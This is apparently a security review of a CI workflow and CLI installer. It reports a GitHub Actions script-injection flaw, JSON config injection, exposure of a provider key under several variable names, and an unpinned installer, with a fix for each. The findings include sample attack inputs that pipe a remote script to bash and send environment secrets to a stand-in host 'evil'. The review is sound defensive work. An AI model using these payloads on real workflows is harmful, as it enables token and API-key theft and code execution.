Verdict: CONCERNS
Failures: 0

<!-- verdict:end -->

# Build Challenge 2 — Security

Lens: Security — auth, secrets, input validation, data exposure, OWASP, RLS/tenancy.

> Partial diff coverage: Large Diff Guard triggered (>10k lines). Reviewed the 4
> highest-risk files only (bkit-cloud.yml, gateguard.js, opencode.json,
> bkit-install.ts) plus the directly-coupled render/parse sites in bkit-modules.ts
> and bkit-cli.ts. Findings limited to that scope.

## Findings

### HIGH

#### GHA script injection — `inputs.issue` interpolated raw into `run:` (both jobs)

File: `.bkit/templates/.github/workflows/bkit-cloud.yml:346` (opencode job) and the same
pattern fed by `:204`/`:212` (claude job, `prompt:` field at `:212`).
Description: On the `workflow_dispatch` path `ARG="$IN_ISSUE"` where `inputs.issue` is a
free-text `type: string` input (`:46-48`). It is written verbatim to `$GITHUB_OUTPUT`
(`arg=$ARG`, `:325`/`:204`) and then template-expanded by GitHub Actions BEFORE the shell
sees it:
`opencode run "/bkit-auto ${{ steps.ctx.outputs.phase }} ${{ steps.ctx.outputs.arg }}"`.
The `${{ }}` substitution happens at YAML-render time, so a crafted issue value lands
inside the double-quoted shell string unescaped.
Attack vector / impact: Anyone with permission to run the workflow (workflow_dispatch
requires write/maintain) supplies `issue` = `1"; curl evil.sh | bash; echo "` (or
backticks / `$( )`). The opencode job runs with `contents: write`, `pull-requests: write`,
`issues: write` and the auto-injected `GITHUB_TOKEN`, plus the live `OPENCODE_PROVIDER_KEY`
and all fanned-out provider keys in env (`:341-344`). Injected commands therefore run with
full repo-write token and can exfiltrate `OPENCODE_PROVIDER_KEY` / `GH_TOKEN` (e.g.
`env | curl -d@- evil`). The claude job has the same shape via the `prompt:` arg (lower
severity there — consumed by the action, not a shell — but `arg`/`phase` still originate
from the same untrusted output). This is the canonical GitHub Actions
untrusted-input-to-`run` sink. The CI-driven path is lower risk (`ARG=$PR_NUMBER` is
numeric from `gh`); the dispatch path is directly attacker-controlled.
Suggested fix: Never interpolate `${{ steps.ctx.outputs.* }}` into a `run:` line. Pass them
through `env:` and reference shell variables, which are not re-parsed by the expansion
engine:

```yaml
env:
  PHASE: ${{ steps.ctx.outputs.phase }}
  ARG: ${{ steps.ctx.outputs.arg }}
run: |
  opencode run "/bkit-auto ${PHASE} ${ARG}"
```

Additionally validate `ARG` in the ctx step (e.g. `[[ "$ARG" =~ ^[0-9A-Za-z._/-]+$ ]] || exit 1`)
since the dispatch input is free-text. `phase` is already constrained to the `choice` enum
on dispatch but is unconstrained on the CI path — guard it too.

### MEDIUM

#### Unvalidated `--opencode=<provider>` flows into opencode.json via string `.replace`

File: `.bkit/src/bkit-cli.ts:282` (value taken verbatim) →
`.bkit/src/bkit-modules.ts:1062-1102` (`renderOpencodeJson`).
Description: The provider CLI value is accepted with no allowlist or charset check
(`opencodeProvider = value`). It is then substituted into the JSON template via three raw
`String.prototype.replace` calls — as the provider key name (`:1082`), into the
`${ENV_VAR}` reference (`:1083`, via `provider.toUpperCase()` for unknown providers,
`:1065-1067`), and indirectly into `baseURL` (`:1066`). A provider value containing a JSON
metacharacter (e.g. `--opencode=x","evil":"`) is injected unescaped into the rendered JSON.
The `JSON.parse` round-trip at `:1092-1099` only normalises VALID JSON; on broken JSON it
falls into `catch` and returns the raw, malformed string (`:1100-1102`), which is then
written to `.opencode/opencode.json`. So the consumer can either inject extra JSON keys
(config tampering) or produce a corrupt config.
Attack vector / impact: Local-only and self-inflicted (the operator running `bkit install`
controls their own machine/repo), so impact is config-integrity, not privilege escalation —
hence MEDIUM not HIGH. But a malformed/over-broad opencode.json could silently widen
`permission.rules` or add an attacker-chosen `baseURL` (pointing the provider apiKey at a
hostile endpoint = key exfiltration on next run).
Suggested fix: Validate the provider value at parse time against
`/^[a-z][a-z0-9-]{0,30}$/` (reject otherwise with `process.exit(1)`), OR build the
opencode.json object programmatically and `JSON.stringify` it rather than string-replacing
sentinels into raw JSON text. At minimum, make the `JSON.parse` failure at `:1100` throw
instead of writing the malformed string.

#### Provider-key fan-out broadens secret blast radius across all provider SDKs

File: `.bkit/templates/.github/workflows/bkit-cloud.yml:341-344`.
Description: `OPENCODE_PROVIDER_KEY` is copied into `NVIDIA_API_KEY`, `OPENROUTER_API_KEY`,
`GEMINI_API_KEY`, and `OPENCODE_PROVIDER_KEY` simultaneously. The committed opencode.json
references exactly one of these, but all four are present in the job env for the opencode
binary and every child process it spawns (the opencode agent has `Bash` allowed,
`opencode.json:21-24`).
Attack vector / impact: The same secret is offered to three different provider SDKs. If the
configured provider is e.g. nvidia, the key is still exported as
`GEMINI_API_KEY`/`OPENROUTER_API_KEY`; any tool/SDK or injected command (see HIGH finding)
that reads those env names receives the live key. Combined with the HIGH script-injection,
`env | curl` leaks the credential under multiple names. Lower severity alone because it
requires another vector to exfiltrate.
Suggested fix: Set only the single env var the rendered opencode.json actually references.
The installer already knows the chosen provider's `envVar`
(`OPENCODE_PROVIDER_DEFAULTS`, bkit-modules.ts:1028-1049) — emit a workflow that exports
just that one name instead of a static fan-out to all providers.

### LOW

#### opencode job — unpinned `curl | bash` installer, missing `set -euo pipefail`

File: `.bkit/templates/.github/workflows/bkit-cloud.yml:330-332` and `:345-346`.
Description: The "Install opencode" step runs `curl -fsSL https://opencode.ai/install | bash`
with no checksum/pin and no `set -euo pipefail`; the Dispatch step also omits the strict
flags (the `ctx` step has them, these do not). `curl | bash` of a remote installer is an
unpinned supply-chain trust point executing in a job that holds repo-write token + provider
key.
Attack vector / impact: A compromise of `opencode.ai/install` (or MITM despite TLS) executes
arbitrary code in the privileged job. Mirrors an accepted upstream pattern, so LOW, but
worth noting the trust boundary.
Suggested fix: Pin the installer to a released opencode version and/or verify a published
checksum before executing; add `set -euo pipefail` to both `run:` blocks.

### INFO

#### gateguard.js advisory hook — no tool-call-content exposure; fail-open is intentional

File: `.bkit/templates/.opencode/plugin/gateguard.js`.
Description: Reviewed for the brief's concern about advisory paths leaking tool-call content.
The hook only reads `tool` (name) and `args.path`/`args.file_path` (`:165-187`); it never
reads or emits tool `content`/arguments. Advisory output (`:206`) is a static checklist
keyed on `path.basename(filePath)` only — no repo content, no secrets. State is written to
the OS temp dir keyed by a sanitised sessionID (`:113-116`), never into the consumer repo.
The fail-open top-level try/catch (`:210-217`) is documented and intentional (a crashing
hook must not break the session); deny-mode re-throw is correctly gated on the bkit marker.
`filePath` is used only as an object key and in `path.basename` — no path-traversal or shell
sink. No action required.

#### Orphan cleanup path is fixed, not user-controlled

File: `.bkit/src/bkit-install.ts:1224-1233`.
Description: The brief asked whether removing `.github/workflows/bkit-auto.yml` could be
abused to delete unintended files. The path is a hardcoded literal joined to
`process.cwd()`; nothing user-supplied feeds it, and `fs.rmSync(..., { force: true })`
targets only that one file. No traversal or wildcard. Safe — no action.

#### Secret handling in opencode.json is correct (env-var indirection, not resolved key)

File: `.bkit/templates/.opencode/opencode.json:60`, `.bkit/src/bkit-modules.ts:1083-1088`.
Description: Confirmed the resolved provider key is NEVER written to disk. opencode.json
carries `"apiKey": "${ENV_VAR}"` (a runtime env reference), and `renderOpencodeJson`
substitutes only the env-var NAME, not its value. The ollama special-case writes the literal
string `"ollama"` (no secret). Correct pattern, matches `docs/security.md` § Secrets
Management (always `${VAR}` reference, never literal). No action.

## Verdict: CONCERNS

(PASS = no actionable security issues; CONCERNS = hardening opportunities; FAIL = exploitable vulnerability)

The HIGH GHA script-injection on the workflow_dispatch path is a real, exploitable sink but
is collaborator-trusted (requires workflow-run permission, not external/anonymous) and is a
mechanical fix (env-passthrough), so it lands as CONCERNS rather than FAIL under the
collaborator-vs-collaborator trust model documented in docs/security.md § CI Auto-Route
Trust. Fix the HIGH and the two MEDIUM items before merge.
